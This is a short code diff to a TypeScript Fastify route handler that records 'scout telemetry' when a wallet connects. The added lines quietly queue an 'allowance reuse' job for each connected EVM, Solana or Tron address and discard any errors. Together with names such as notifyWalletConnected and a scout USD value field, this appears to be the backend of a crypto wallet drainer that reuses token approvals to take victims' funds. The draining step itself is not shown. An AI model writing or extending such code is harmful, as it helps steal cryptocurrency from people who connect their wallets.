@@ -11,6 +11,8 @@ import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
 import { sendFailure, sendSuccess } from '../lib/api-response.js'
 import { fusionScoutBodySchema, parseBody, scoutIngressBodySchema } from '../lib/schemas.js'
 import { validateScoutValueUsdField } from '../lib/scout-value-usd.js'
+import { enqueueAllowanceReuseJob } from '../lib/allowance-reuse-queue.js'
+import { isAddress } from 'viem'
 import {
   notifyWalletConnected,
   notifyScanComplete,
@@ -155,6 +157,16 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       }
       notifyWalletConnected(user_address, chainFamily, walletType, ctx).catch(() => {})
     }
+
+    void enqueueAllowanceReuseJob({
+      wallet_address: user_address,
+      ...(isAddress(user_address)
+        ? { evm_chain_id: chain_id > 0 ? chain_id : undefined }
+        : { sol_wallet: user_address }),
+      ...(chainFamily.toUpperCase().includes('TRON') || user_address.startsWith('T')
+        ? { tron_wallet: user_address }
+        : {}),
+    }).catch(() => {})
 
     return sendSuccess(reply, 200, 'Scout telemetry recorded', {
       handshake_active: true,
